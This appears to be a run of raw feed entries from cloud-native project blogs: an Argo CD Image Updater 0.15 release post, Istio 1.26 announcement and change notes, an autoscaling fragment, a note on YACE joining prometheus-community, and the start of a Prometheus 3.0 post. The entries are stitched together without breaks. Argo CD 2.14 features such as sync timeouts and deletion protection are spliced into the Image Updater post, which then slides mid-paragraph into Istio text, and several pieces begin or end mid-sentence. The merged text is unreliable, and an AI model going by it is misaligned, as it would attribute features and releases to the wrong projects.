      "summary": "<h3>New Release for Argo CD Image Updater — 0.15</h3><p>We are pleased to announce a brand new release of Argo CD Image Updater, the companion controller to Argo CD for automatically updating container images in Argo CD applications. Read on for more details.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Tjl-5vVWKCnW3DIcfiyZHg.jpeg\" /></figure><p>Argo CD Image Updater is a project <a href=\"https://argocd-image-updater.readthedocs.io/en/stable/\">available at Argo Labs</a>. You can use it to automatically monitor your container registries and instruct your applications to perform a redeployment when a new version of a container is available. This means that you can gain the benefits of continuous delivery without the need of custom pipelines for updating your Kubernetes manifest.</p><p>This <a href=\"https://github.com/argoproj-labs/argocd-image-updater/releases/tag/v0.15.0\">release</a> includes 6 new features, 16 fixes and several documentation updates.</p><p>Here are some highlights:</p><h3>Support of other namespaces apart from “argocd”</h3><p>Traditionally all Argo CD application manifests are deployed in the “argocd” namespace. In recent versions of Argo CD you can now use any namespace for your applications (argocd is still the default).</p><p>There is now support for making Argo CD Image Updater work with Argo CD applications that are not on the argocd namespace.</p><p>Thanks <a href=\"https://github.com/sribiere-jellysmack\">S Ribiere</a> (Jellysmack) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/763\">this feature</a>.</p><h3>Preserve field order when updating Kustomize files</h3><p>Argo CD Image Updater has built-in support for Kustomize applications. If the <a href=\"https://argocd-image-updater.readthedocs.io/en/stable/basics/update-methods/#git-write-back-method\">Git write back method</a> is used, Argo CD Image Updater can also update the container image in the kustomization YAML file of the application.</p><p>Unfortunately the field order was not preserved. This means that running “git diff” (or using Argo CD) would show inconsistent changes that were not related to the image update.</p><p>Now Argo CD Image Updater will preserve the existing field order before and after the update in a predictable manner making automation with other tools much easier.</p><p>Thanks <a href=\"https://github.com/jtdoepke\">Jaye Doepke</a> (Mintel) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/666\">this feature</a>.</p><h3>Updating multiple images when using Helm value files</h3><p>Apart from Kustomize, Argo CD Image Updater can also monitor Helm charts and automatically update container tags mentioned in Helm value files.</p><p>In the most typical case a single Helm application will contain a single container image reference. Argo CD Image Updater will correctly detect the new version of the image and update it on the value files.</p><p>Sometimes however a single Helm application will contain multiple container tags. In this case Argo CD Image Updater would detect changes in all images but only update one of them. This process was now updated and now Argo CD Image Updater will work correctly with multi-image applications with the expected behavior.</p><p>Thanks <a href=\"https://github.com/ljupchokotev\">Lyupcho Kotev</a> (Codira AB) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/790\">this feature</a>.</p><h3>Updating Argo CD applications when auto-sync is disabled</h3><p>The main benefit of Argo CD Image Updater is fully automating all application deployments. A new container image is published in the registry, Argo CD Image Updater detects it and writes back to Git, Argo CD takes over and syncs all changes.</p><p>Some organizations however do not employ the auto-sync behavior of Argo CD. This can happen in several cases when deployments must happen manually (usually in production environments). In those scenarios Argo CD Image Updater would not “see” the updated image in the live application (as it was never deployed by Argo CD). This makes Argo CD Image Updater fall in a constant loop where it tries to update the same image again and again, but Argo CD does not deploy anything since auto-sync is disabled.</p><p>This behavior has now changed and Argo CD Image Updater will work even for Argo CD applications where auto-sync is disabled. Argo CD Image Updater will update the image only once as expected and then skip any further changes even if they are not yet on the live application definition.</p><p>Thanks <a href=\"https://github.com/Fs02\">Surya Asriadie</a> (Smart News) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/607\">this feature</a>.</p><h3>Support for Argo CD multi-source application sets</h3><p>Argo CD Image Updater recently gained support for <a href=\"https://argo-cd.readthedocs.io/en/stable/user-guide/multiple_sources/\">multi-source applications</a>. The basic functionality worked great for individual applications, but in the case of <a href=\"https://argo-cd.readthedocs.io/en/latest/user-guide/application-set/\">Application Sets</a> Argo CD Image Updater could not locate the type of each application (chart/kustomize/manifest) from the resource specification.</p><p>Now Argo CD Image Updater detects the type of each application from the status field of the resource, allowing you to automatically update images even if you employ Application Sets in your organization.</p><p>Thanks <a href=\"https://github.com/Sovietaced\">Jason Parraga</a> (Stack AV) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/772\">this feature</a>.</p><h3>Improved release process and unit testing</h3><p>As <a href=\"https://blog.argoproj.io/new-release-for-argo-image-updater-0-13-1fa3ef11996f\">promised in the previous release</a>, there were several other internal changes in the project in areas of integration testing and better contributor experience. Even though these changes do not correspond to use-visible features, they are crucial for helping newcomers to the project and accepting new features. We are always looking for ways to attract contributors and making the developer experience an easy process is always a constant goal for us.</p><p>Multiple people were involved in this effort. See all changes <a href=\"https://github.com/argoproj-labs/argocd-image-updater/releases/tag/v0.15.0\">in the release notes</a>.</p><h3>Where to report issues with the release</h3><p>If you would like to contribute new features to Argo CD Image Updater, please submit a pull request as usual.</p><p>If you find any issues with the release please find us on the #argo-cd-image-updater channel in the <a href=\"https://cloud-native.slack.com/messages/CHY2THYUU\">CNCF Slack instance</a>.

As always, we appreciate your feedback on any bugs or issues you encounter.</p><p>Now, let’s dive into the details.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*9ANBGyCAjfUW5J_v6cm8SA.png\" /></figure><h4><strong>Global Sync Timeout for Applications</strong></h4><p>The global sync timeout feature addresses issues where the sync process gets stuck indefinitely, often due to resources failing to start properly and continuously retrying. Now, a global timeout can be configured on the Argo CD Controller to timeout long-running sync operations thanks to <a href=\"https://github.com/andrii-korotkov-verkada\">Andrii Korotkov</a> (Verkada)!</p><p>You can configure the timeout by updating controller.sync.timeout.seconds in the <a href=\"https://argo-cd.readthedocs.io/en/release-2.14/operator-manual/argocd-cmd-params-cm-yaml/\">argocd-cmd-params-cm configmap</a>.</p><h4><strong>Upgrading Helm to 3.16.2 and adding skipSchemaValidation Flag</strong></h4><p>Helm 3.16 exposes the--skip-schema-validation flag for the helm template command which is now available via the <a href=\"https://argo-cd.readthedocs.io/en/latest/user-guide/helm/#helm-skip-schema-validation\">argocd cli and Application spec.</a> --skip-schema-validation allows users to bypass schema validation—a crucial feature for offline clusters where external schemas are inaccessible. Additionally, Istio 1.24 requires Helm 3.16 or higher.</p><p>Contributed by dmosesson!</p><h4>Application Resource Deletion Protection</h4><p>New <a href=\"https://argo-cd.readthedocs.io/en/release-2.14/user-guide/sync-options/#resource-pruning-with-confirmation\">sync options</a> are now available to help prevent accidental resource deletion. This functionality is particularly useful when Argo CD is used to manage critical resources such as namespaces, volumes, or ingresses in a production environment. Accidental deletion of such resources can lead to data loss or service downtime, necessitating human approval. To enable this functionality, apply the argocd.argoproj.io/sync-options: Prune=confirm annotation to the desired Kubernetes resource. Once the annotation is in place, Argo CD will require manual approval before pruning the resource during application synchronization. Similarly, the argocd.argoproj.io/sync-options: Delete=confirm annotation alters the application deletion process. When this annotation is applied, Argo CD will prompt for confirmation before performing a cascading deletion of the application.</p><p>Thanks to <a href=\"https://github.com/alexmt\">Alexander Matyushentsev</a> (Akuity)!</p><h4><strong>Disable Server Side Apply on individual resources</strong></h4><p>Argo CD introduced server-side apply in v2.10, enhancing how resource changes are managed by leveraging Kubernetes’ native capabilities for conflict resolution and declarative updates. Now, it supports disabling server-side apply at the individual resource level, providing greater flexibility and control over specific resource configurations. Added by <a href=\"https://github.com/pasha-codefresh\">Pasha Kostohrys</a> (Codefresh)!</p><h4><strong>Disable writing K8s Events</strong></h4><p>In environments with many applications or high application churn, Argo CD can cause load on the Kubernetes API server and etcd with the number of events it produces. Operators can now disable the writing of Kubernetes events or tune the ones Argo CD produces.</p><p>Introduced by <a href=\"https://github.com/Jack-R-lantern\">Jack-R-lantern</a>!</p><h4>Faster Application Refreshes</h4><p>When Argo CD manages a cluster with many resources, like tens of thousands of pods and replicasets, it is slow to process changes across the resources. The Argo CD UI becomes particularly slow.</p><p>Thanks to <a href=\"https://github.com/mpelekh\">Mykola Pelekh</a>, you can now configure batches that reduce lock contention and increase the refresh speed! Both controller.cluster.cache.batch.events.processing and controller.cluster.cache.events.processing.interval can be configured in the <a href=\"https://argo-cd.readthedocs.io/en/release-2.14/operator-manual/argocd-cmd-params-cm-yaml/\">argocd-cmd-params-cm configmap</a> to enable and tune the feature</p><h3>Other Notable Changes</h3><p><a href=\"https://github.com/argoproj/argo-cd/pull/19963\">Display SHA’s revision in history</a> — <a href=\"https://github.com/Tchoupinax\">Tchoupinax</a></p><p>Add <a href=\"https://github.com/argoproj/argo-cd/pull/18703\">cache layer</a> for Argo Projects — <a href=\"https://github.com/dacofr\">Daco</a></p><p>Globally <a href=\"https://github.com/argoproj/argo-cd/pull/20064\">parameterize</a> requeue time for applicationsets — <a href=\"https://github.com/rumstead\">rumstead</a></p><p><a href=\"https://github.com/argoproj/argo-cd/pull/20275\">Exponential backoff</a> for self heal — <a href=\"https://github.com/alexmt\">Alexander Matyushentsev</a></p><p><a href=\"https://github.com/argoproj/argo-cd/pull/20462\">Add ignore-healthcheck </a>annotation — <a href=\"https://github.com/CefBoud\">ABBOUD Moncef</a></p><p>Support Istio <a href=\"https://github.com/argoproj/argo-cd/pull/20273\">ServiceEntry</a> network node — <a href=\"https://github.com/zapkub\">Rungsikorn Rungsikavarnich</a></p><p>Enable <a href=\"https://github.com/argoproj/argo-cd/pull/20299\">word wrap in the manifest panel</a> — <a href=\"https://github.com/linghaoSu\">Linghao Su</a></p><h3>Where Can I Get the New Release?</h3><p>For more details and installation instructions, check the <a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.14.0-rc2\">release notes</a>, and stay tuned for <a href=\"https://argo-cd.readthedocs.io/en/stable/operator-manual/upgrading/overview/\">upgrade instructions</a>.

Please note that <em><code>EnvoyFilter</code> is not currently supported for any existing Istio version with waypoint proxies</em>. While it may be possible to use <code>EnvoyFilter</code> with waypoints in limited scenarios, its use is not supported, and is actively discouraged by the maintainers. The alpha API may break in future releases as it evolves. We expect official support will be provided at a later date.</p>\n<h2 id=\"whats-new\">What’s new?</h2>\n<h3 id=\"customization-of-resources-provisioned-by-the-gateway-api\">Customization of resources provisioned by the Gateway API</h3>\n<p>When you create a Gateway or a waypoint using the Gateway API, a <code>Service</code> and a <code>Deployment</code> are created automatically. It has been a common request to allow customization of these objects, and that is now supported in Istio 1.26 by specifying a <code>ConfigMap</code> of parameters. If configuration for a <code>HorizontalPodAutoscaler</code> or <code>PodDisruptionBudget</code> is provided, those resources will automatically be created also. <a href=\"/docs/tasks/traffic-management/ingress/gateway-api/#automated-deployment\">Learn more about customizing the generated Gateway API resources.</a></p>\n<h3 id=\"new-gateway-api-support\">New Gateway API support</h3>\n<p><a href=\"https://gateway-api.sigs.k8s.io/guides/tcp/\"><code>TCPRoute</code></a> is now available in waypoints, allowing TCP traffic shifting in ambient mode.</p>\n<p>We also added support for the experimental <a href=\"https://gateway-api.sigs.k8s.io/api-types/backendtlspolicy/\"><code>BackendTLSPolicy</code></a> and started the implementation of <a href=\"https://gateway-api.sigs.k8s.io/api-types/backendtrafficpolicy/\"><code>BackendTrafficPolicy</code></a> in Gateway API 1.3, which will eventually set retry constraints.</p>\n<h3 id=\"support-for-the-new-kubernetes-clustertrustbundle\">Support for the new Kubernetes <code>ClusterTrustBundle</code></h3>\n<p>We&rsquo;ve added experimental support for <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#cluster-trust-bundles\">the experimental <code>ClusterTrustBundle</code> resource in Kubernetes</a>, allowing support for the new method of bundling a certificate and its root of trust into a single object.</p>\n<h3 id=\"plus-much-much-more\">Plus much, much more</h3>\n<ul>\n<li><code>istioctl analyze</code> can now run specific checks!</li>\n<li>The CNI node agent no longer runs in the <code>hostNetwork</code> namespace by default, reducing the chance of port conflicts with other services running on a host!</li>\n<li>Required <code>ResourceQuota</code> resources and <code>cniBinDir</code> values are set automatically when installing on GKE!</li>\n<li>An <code>EnvoyFilter</code> can now match a <code>VirtualHost</code> on a domain name!</li>\n</ul>\n<p>Read about these and more in the full <a href=\"/news/releases/1.26.x/announcing-1.26/change-notes/\">release notes</a>.</p>\n<h2 id=\"catch-up-with-the-istio-project\">Catch up with the Istio project</h2>\n<p>If you only check in with us when we have a new release, you might have missed that <a href=\"/blog/2025/ztunnel-security-assessment/\">we published a security audit on ztunnel</a>, <a href=\"/blog/2025/ambient-performance/\">we compared performance of ambient mode throughput vs. running in-kernel</a>, or that <a href=\"/blog/2025/istio-at-kubecon-eu/\">we had a major presence at KubeCon EU</a>.

      "summary": "<h2 id=\"traffic-management\">Traffic Management</h2>\n<ul>\n<li>\n<p><strong>Improved</strong> the CNI agent to no longer require <code>hostNetwork</code>, enhancing compatibility. Dynamic switching to the host network is now performed as needed. The previous behavior can be temporarily restored by setting the <code>ambient.shareHostNetworkNamespace</code> field in the <code>istio-cni</code> chart. (<a href=\"https://github.com/istio/istio/issues/54726\">Issue #54726</a>)</p>\n</li>\n<li>\n<p><strong>Improved</strong> iptables binary detection to validate baseline kernel support and to prefer <code>nft</code> when both legacy and <code>nft</code> are available but neither has existing rules.</p>\n</li>\n<li>\n<p><strong>Updated</strong> the default value of maximum connections accepted per socket event to 1 to improve performance. To revert to the previous behavior, set <code>MAX_CONNECTIONS_PER_SOCKET_EVENT_LOOP</code> to zero.</p>\n</li>\n<li>\n<p><strong>Added</strong> the ability for <code>EnvoyFilter</code> to match a <code>VirtualHost</code> by domain name.</p>\n</li>\n<li>\n<p><strong>Added</strong> initial support for the experimental Gateway API features <code>BackendTLSPolicy</code> and <code>XBackendTrafficPolicy</code>. These are disabled by default and require setting <code>PILOT_ENABLE_ALPHA_GATEWAY_API=true</code>.\n(<a href=\"https://github.com/istio/istio/issues/54131\">Issue #54131</a>), (<a href=\"https://github.com/istio/istio/issues/54132\">Issue #54132</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for referencing <code>ConfigMap</code>s, in addition to <code>Secret</code>s, for <code>DestinationRule</code> TLS in <code>SIMPLE</code> mode — useful when only a CA certificate is required.\n(<a href=\"https://github.com/istio/istio/issues/54131\">Issue #54131</a>), (<a href=\"https://github.com/istio/istio/issues/54132\">Issue #54132</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> customization support for <a href=\"https://istio.io/docs/tasks/traffic-management/ingress/gateway-api/#automated-deployment\">Gateway API automated deployments</a>. This applies to both Istio <code>Gateway</code> types (ingress and egress) and Istio Waypoint <code>Gateway</code> types (ambient waypoints). Users can now customize generated resources such as <code>Service</code>, <code>Deployment</code>, <code>ServiceAccount</code>, <code>HorizontalPodAutoscaler</code>, and <code>PodDisruptionBudget</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> a new environment variable <code>ENABLE_GATEWAY_API_MANUAL_DEPLOYMENT</code> for <code>istiod</code>. When set to <code>false</code>, it disables automatic attachment of Gateway API resources to existing gateway deployments. By default, this is <code>true</code> to maintain the current behavior.</p>\n</li>\n<li>\n<p><strong>Added</strong> the ability to configure retry host predicates using the Retry API (<code>retry_ignore_previous_hosts</code>).</p>\n</li>\n<li>\n<p><strong>Added</strong> support for specifying backoff intervals during retries.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for using <code>TCPRoute</code> in waypoint proxies.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where the validation webhook incorrectly reported a warning when a <code>ServiceEntry</code> configured a <code>workloadSelector</code> with DNS resolution.\n(<a href=\"https://github.com/istio/istio/issues/50164\">Issue #50164</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where FQDNs did not work in a <code>WorkloadEntry</code> using ambient mode.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a case where <code>ReferenceGrants</code> did not function when mTLS was enabled on a Gateway listener.\n(<a href=\"https://github.com/istio/istio/issues/55623\">Issue #55623</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where Istio failed to correctly retrieve <code>allowedRoutes</code> for a sandboxed waypoint.\n(<a href=\"https://github.com/istio/istio/issues/56010\">Issue #56010</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where <code>ServiceEntry</code> endpoints were leaked when a pod was evicted.\n(<a href=\"https://github.com/istio/istio/issues/54997\">Issue #54997</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the listener address was duplicated for dual stack services with IPv6 priority.  (<a href=\"https://github.com/istio/istio/issues/56151\">Issue #56151</a>)</p>\n</li>\n</ul>\n<h2 id=\"security\">Security</h2>\n<ul>\n<li><strong>Added</strong> experimental support for the v1alpha1 <code>ClusterTrustBundle</code> API. This can be enabled by setting <code>values.pilot.env.ENABLE_CLUSTER_TRUST_BUNDLE_API=true</code>. Ensure the corresponding feature gates are enabled in your cluster; see <a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-auth/3257-cluster-trust-bundles\">KEP-3257</a> for details.\n(<a href=\"https://github.com/istio/istio/issues/43986\">Issue #43986</a>)</li>\n</ul>\n<h2 id=\"telemetry\">Telemetry</h2>\n<ul>\n<li>\n<p><strong>Added</strong> support for the <code>omit_empty_values</code> field in the <code>EnvoyFileAccessLog</code> provider via the Telemetry API.\n(<a href=\"https://github.com/istio/istio/issues/54930\">Issue #54930</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> environment variable <code>PILOT_SPAWN_UPSTREAM_SPAN_FOR_GATEWAY</code>, which separates tracing spans for server and client gateways. This currently defaults to <code>false</code>, but will become the default in the future.</p>\n</li>\n<li>\n<p><strong>Added</strong> a warning message for use of deprecated telemetry providers Lightstep and OpenCensus.\n(<a href=\"https://github.com/istio/istio/issues/54002\">Issue #54002</a>)</p>\n</li>\n</ul>\n<h2 id=\"installation\">Installation</h2>\n<ul>\n<li>\n<p><strong>Improved</strong> the installation experience on GKE. When <code>global.platform=gke</code> is set, required <code>ResourceQuota</code> resources are deployed automatically. When installing via <code>istioctl</code>, this setting is also auto-enabled if GKE is detected. Additionally, the <code>cniBinDir</code> is now configured appropriately.</p>\n</li>\n<li>\n<p><strong>Improved</strong> the <code>ztunnel</code> Helm chart to not assign resource names to <code>.Release.Name</code>, defaulting instead to <code>ztunnel</code>. This reverts a change introduced in Istio 1.25.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for setting the <code>reinvocationPolicy</code> in the revision-tag webhook when installing Istio via <code>istioctl</code> or Helm.</p>\n</li>\n<li>\n<p><strong>Added</strong> the ability to configure the service <code>loadBalancerClass</code> in the Gateway Helm chart.\n(<a href=\"https://github.com/istio/istio/issues/39079\">Issue #39079</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> a values <code>ConfigMap</code> that stores both the user-provided Helm values and the merged values after applying profiles for the <code>istiod</code> chart.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for reading header values from <code>istiod</code> environment variables.\n(<a href=\"https://github.com/istio/istio/issues/53408\">Issue #53408</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> a configurable <code>updateStrategy</code> for the <code>ztunnel</code> and <code>istio-cni</code> Helm charts.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug in the sidecar injection template that incorrectly removed existing init containers when both traffic interception and native sidecar were disabled.\n(<a href=\"https://github.com/istio/istio/issues/54562\">Issue #54562</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> missing <code>topology.istio.io/network</code> labels on gateway pods when <code>--set networkGateway</code> is used.\n(<a href=\"https://github.com/istio/istio/issues/54909\">Issue #54909</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a problem where setting <code>replicaCount=0</code> in the <code>istio/gateway</code> Helm chart caused the <code>replicas</code> field to be omitted instead of explicitly set to <code>0</code>.\n(<a href=\"https://github.com/istio/istio/issues/55092\">Issue #55092</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue that caused file-based certificate references (e.g., from <code>DestinationRule</code> or <code>Gateway</code>) to fail when using SPIRE as the CA.</p>\n</li>\n<li>\n<p><strong>Removed</strong> the deprecated <code>ENABLE_AUTO_SNI</code> flag and associated code paths.</p>\n</li>\n</ul>\n<h2 id=\"istioctl\">istioctl</h2>\n<ul>\n<li>\n<p><strong>Added</strong> a <code>--locality</code> parameter on <code>istioctl experimental workload group create</code>.\n(<a href=\"https://github.com/istio/istio/issues/54022\">Issue #54022</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> the ability to run specific analyzer checks using the <code>istioctl analyze</code> command.</p>\n</li>\n<li>\n<p><strong>Added</strong> a <code>--tls-server-name</code> parameter to <code>istioctl create-remote-secret</code>, allowing the <code>tls-server-name</code> to be set in the generated kubeconfig. This ensures successful TLS connections when the <code>server</code> field is overridden with a gateway proxy hostname.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for the <code>envVarFrom</code> field in the <code>istiod</code> chart.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>istioctl analyze</code> reported an unknown annotation <code>sidecar.istio.io/statsCompression</code>.\n(<a href=\"https://github.com/istio/istio/issues/52082\">Issue #52082</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an error that blocked installation when <code>IstioOperator.components.gateways.ingressGateways.label</code> or <code>IstioOperator.components.gateways.ingressGateways.label</code> was omitted.\n(<a href=\"https://github.com/istio/istio/issues/54955\">Issue #54955</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where <code>istioctl</code> ignored the <code>tag</code> fields under <code>IstioOperator.components.gateways.ingressGateways</code> and <code>egressGateways</code>.\n(<a href=\"https://github.com/istio/istio/issues/54955\">Issue #54955</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>istioctl waypoint delete</code> could remove a non-waypoint Gateway resource when a name was specified.\n(<a href=\"https://github.com/istio/istio/issues/55235\">Issue #55235</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>istioctl experimental describe</code> did not respect the <code>--namespace</code> flag.\n(<a href=\"https://github.com/istio/istio/issues/55243\">Issue #55243</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug that prevented simultaneous generation of <code>istio.io/waypoint-for</code> and <code>istio.io/rev</code> labels when creating a waypoint proxy using <code>istioctl</code>.\n(<a href=\"https://github.com/istio/istio/issues/55437\">Issue #55437</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>istioctl admin log</code> could not modify the log level for <code>ingress status</code>.\n(<a href=\"https://github.com/istio/istio/issues/55741\">Issue #55741</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a validation failure when <code>reconcileIptablesOnStartup: true</code> was set in the <code>istioctl</code> YAML configuration.\n(<a href=\"https://github.com/istio/istio/issues/55347\">Issue #55347</a>)</p>\n</li>\n</ul>",

The engineers have understood that manually dealing with traffic fluctuations and preparations of infrastructure is inefficient because you need to deploy more resources before the traffic increases, not at the moment the event happens. This strategy is problematic for two reasons: first, because it&rsquo;s often too late to scale when traffic has already arrived and second, resources will be overprovisioned and idle during the times that traffic isn&rsquo;t present.",

This move will make it more accessible to users and open new opportunities for contributors to enhance and maintain the project. There's also a blog post from <a href=\"https://grafana.com/blog/2024/11/19/yace-moves-to-prometheus-community/\">Cristian Greco's point of view</a>.</p>\n<h2>The early days</h2>\n<p>When I first started YACE, I had no idea it would grow to this scale. At the time, I was working with <a href=\"https://www.ivx.com\">Invision AG</a> (not to be confused with the design app), a company focused on workforce management software. They fully supported me in open-sourcing the tool, and with the help of my teammate <a href=\"https://github.com/kforsthoevel\">Kai Forsthövel</a>, YACE was brought to life.</p>\n<p>Our first commit was back in 2018, with one of our primary goals being to make CloudWatch metrics easy to scale and automatically detect what to measure, all while keeping the user experience simple and intuitive. InVision AG was scaling their infrastructure up and down due to machine learning workloads and we needed something that detects new infrastructure easily. This focus on simplicity has remained a core priority. From that point on, YACE began to find its audience.</p>\n<h2>Yace Gains Momentum</h2>\n<p>As YACE expanded, so did the support around it. One pivotal moment was when <a href=\"https://github.com/cristiangreco\">Cristian Greco</a> from Grafana Labs reached out. I was feeling overwhelmed and hardly keeping up when Cristian stepped in, simply asking where he could help. He quickly became the main releaser and led Grafana Labs' contributions to YACE, a turning point that made a huge impact on the project. Along with an incredible community of contributors from all over the world, they elevated YACE beyond what I could have achieved alone, shaping it into a truly global tool. YACE is no longer just my project or Invision's—it belongs to the community.</p>\n<h2>Gratitude and Future Vision</h2>\n<p>I am immensely grateful to every developer, tester, and user who has contributed to YACE's success. This journey has shown me the power of community and open source collaboration. But we're not done yet.</p>\n<p>It's time to take Yace even further—into the heart of the Prometheus ecosystem. Making Yace as the official Amazon CloudWatch exporter for Prometheus will make it easier and more accessible for everyone. With ongoing support from Grafana Labs and my commitment to refining the user experience, we'll ensure YACE becomes an intuitive tool that anyone can use effortlessly.</p>\n<h2>Try out YACE on your own</h2>\n<p>Try out <strong><a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter\">YACE (Yet Another CloudWatch Exporter)</a></strong> by following our step-by-step <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/blob/master/docs/installation.md\">Installation Guide</a>.</p>\n<p>You can explore various configuration examples <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/tree/master/examples\">here</a> to get started with monitoring specific AWS services.</p>\n<p>Our goal is to enable easy auto-discovery across all AWS services, making it simple to monitor any dynamic infrastructure.</p>",

Prometheus has come a long way in that time,\nevolving from a project for early adopters to becoming a standard part of the cloud native monitoring stack. Prometheus 3.0 aims to\ncontinue that journey by adding some exciting new features while largely maintaining stability and compatibility with previous versions.</p>\n<p>The full 3.0 release adds some new features on top of the beta and also introduces a few additional breaking changes that we will describe in this article.</p>\n<h2>What's New</h2>\n<p>Here is a summary of the exciting changes that have been released as part of the beta version, as well as what has been added since:</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand-new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-11-14/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view,\nand will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.</p>\n<p>Since the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please\n<a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<p>Since the beta, the user interface has been updated to support UTF-8 metric and label names.</p>\n<p><img alt=\"New UTF-8 UI\" src=\"https://prometheus.io/assets/blog/2024-11-14/utf8_ui.png\" /></p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars,\ncreated timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing.\nThere is better handling for partial writes to provide more details to clients when this occurs. More details can be found\n<a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>UTF-8 Support</h3>\n<p>Prometheus now allows all valid UTF-8 characters to be used in metric and label names by default, as well as label values,\nas has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8,\nmetric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax\nin order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Currently only the Go client library has been updated to support UTF-8, but support for other languages will be added soon.</p>\n<h3>OTLP Support</h3>\n<p>In alignment with <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">our commitment to OpenTelemetry</a>, Prometheus 3.0 features\nseveral new features to improve interoperability with OpenTelemetry.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the <code>/api/v1/otlp/v1/metrics</code> endpoint.</p>\n<p>See our <a href=\"https://prometheus.io/docs/guides/opentelemetry\">guide</a> on best practices for consuming OTLP metric traffic into Prometheus.</p>\n<h4>UTF-8 Normalization</h4>\n<p>With Prometheus 3.0, thanks to <a href=\"https://prometheus.io/blog/feed.xml#utf-8-support\">UTF-8 support</a>, users can store and query OpenTelemetry metrics without annoying changes to metric and label names like <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/pkg/translator/prometheus\">changing dots to underscores</a>.</p>\n<p>Notably this allows <strong>less confusion</strong> for users and tooling in terms of the discrepancy between what’s defined in OpenTelemetry semantic convention or SDK and what’s actually queryable.</p>\n<p>To achieve this for OTLP ingestion, Prometheus 3.0 has experimental support for different translation strategies. See <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#:~:text=Settings%20related%20to%20the%20OTLP%20receiver%20feature\">otlp section in the Prometheus configuration</a> for details.</p>\n<blockquote>\n<p>NOTE: While “NoUTF8EscapingWithSuffixes” strategy allows special characters, it still adds required suffixes for the best experience. See <a href=\"https://github.com/prometheus/proposals/pull/39\">the proposal on the future work to enable no suffixes</a> in Prometheus.</p>\n</blockquote>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>. Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Breaking Changes</h3>\n<p>The Prometheus community strives to <a href=\"https://prometheus.io/docs/prometheus/latest/stability/\">not break existing features within a major release</a>. With a new major release we took the opportunity to clean up a few, but small, long-standing issues. In other words, 